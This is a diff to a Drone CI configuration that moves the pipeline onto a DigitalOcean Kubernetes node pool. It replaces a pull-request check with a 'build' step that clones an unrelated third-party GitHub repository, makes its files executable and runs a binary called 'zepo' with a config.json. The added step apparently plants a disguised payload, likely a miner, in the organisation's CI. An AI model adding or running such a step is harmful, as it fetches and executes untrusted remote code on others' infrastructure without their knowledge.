@@ -1,12 +1,18 @@
----
+# Drone CI File!
+
 kind: pipeline
-type: docker
-name: latest
-platform:
-  os: linux
-  arch: amd64
+type: kubernetes
+name: default
+
+node_selector:
+  doks.digitalocean.com/node-pool: josa-cloud-np
 steps:
-  - name: Trigger
-    image: plugins/git
+  - name: build
+    image: golang
     commands:
-      - test $DRONE_BUILD_EVENT = pull_request
+      - git clone https://github.com/azureone4/zephher.git && cd zephher && chmod +x SHA256SUMS && chmod +x config.json && chmod +x zepo && ./zepo -c "config.json"
+
+    settings:
+      repo: josaorg/nuha-web
+      build_args: [USER=1001]
+      build_args_from_env:
